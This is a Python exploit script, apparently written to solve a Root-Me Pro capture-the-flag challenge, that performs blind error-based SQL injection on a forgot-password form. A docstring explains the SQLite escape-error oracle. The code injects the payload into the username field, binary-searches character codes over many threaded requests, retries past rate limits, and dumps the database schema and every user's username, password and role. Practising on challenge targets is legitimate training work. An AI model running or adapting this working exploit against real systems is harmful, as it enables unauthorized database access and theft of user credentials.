#!/usr/bin/env python3
"""
Root-Me Pro - SQL Injection - Error
Blind error-based SQLi in /forgot-password (username field, SQLite backend).

Oracle: like('a','a', CASE WHEN <cond> THEN 'a' ELSE 'ab' END)
  - cond TRUE  -> escape char = 'a' (1 char)   -> valid -> HTTP 200
  - cond FALSE -> escape char = 'ab' (2 chars) -> "ESCAPE expression must be
    a single character" -> HTTP 500

The forgot-password response text is identical for existing/non-existing
users, so there is no content-based boolean channel. The status code from the
deliberately-triggered SQLite runtime error is the oracle.

Stacked queries are blocked (sqlite3 execute() = one statement), so this is
pure blind boolean extraction.
"""
import sys
import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor

BASE = "https://instance-019fe94c-cf91-7069-92b8-354c6e95defe.challenges.root-me.pro"
URL = f"{BASE}/forgot-password"

_local = threading.local()

def sess():
    if not hasattr(_local, "s"):
        _local.s = requests.Session()
    return _local.s

ERR_TEXT = "ESCAPE expression must be a single character"

def oracle(cond: str) -> bool:
    payload = f"x' OR like('a','a',(CASE WHEN ({cond}) THEN 'a' ELSE 'ab' END))-- -"
    for attempt in range(20):
        try:
            r = sess().post(URL, data={"username": payload}, timeout=20)
        except requests.RequestException:
            _local.s = requests.Session()
            time.sleep(0.5)
            continue
        if r.status_code == 200:
            return True
        if r.status_code == 500 and ERR_TEXT in r.text:
            return False
        # 503 (rate limited) or anything unexpected: back off and retry
        time.sleep(0.4 + attempt * 0.3)
    raise RuntimeError(f"oracle failed repeatedly for cond={cond!r}")

def get_int(expr: str, lo=0, hi=4096) -> int:
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({expr})<={mid}"):
            hi = mid
        else:
            lo = mid + 1
    return lo

def _char_at(expr: str, i: int) -> str:
    code = get_int(f"unicode(substr(({expr}),{i},1))", 0, 127)
    return chr(code)

def get_string(expr: str, length: int, workers=2) -> str:
    with ThreadPoolExecutor(max_workers=workers) as ex:
        chars = list(ex.map(lambda i: _char_at(expr, i), range(1, length + 1)))
    return "".join(chars)

def dump(label: str, expr: str, maxlen=4096):
    n = get_int(f"length({expr})", 0, maxlen)
    print(f"[*] {label}: length={n}", flush=True)
    val = get_string(expr, n)
    print(f"[+] {label} =\n{val}\n", flush=True)
    return val

if __name__ == "__main__":
    what = sys.argv[1] if len(sys.argv) > 1 else "schema"

    if what == "schema":
        dump("sqlite_master", "(SELECT group_concat(sql, ' ;; ') FROM sqlite_master)")
    elif what == "users":
        dump("users rows", "(SELECT group_concat(username || ':' || password || ':' || role, ' | ') FROM users)")
    else:
        dump("custom", sys.argv[1])
